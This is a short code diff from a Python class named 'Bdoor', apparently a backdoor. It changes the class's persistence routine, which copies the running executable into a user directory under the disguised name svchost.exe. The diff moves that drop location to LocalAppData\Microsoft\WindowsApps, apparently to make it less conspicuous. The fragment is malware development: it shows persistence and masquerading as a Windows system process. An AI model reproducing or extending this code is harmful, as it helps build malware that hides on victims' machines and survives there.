@@ -27,7 +27,7 @@ class Bdoor:
         self.cli = self.cli_p["default"]
     
     def pers__(self):
-        l_pers__ = os.environ["AppData"] + "\\Microsoft\\svchost.exe"
+        l_pers__ = os.environ["localappdata"] + "\\Microsoft\\WindowsApps\\svchost.exe"
         if not os.path.exists(l_pers__):
             # Copy the current executalbe file.
             shutil.copyfile(sys.executable, l_pers__)
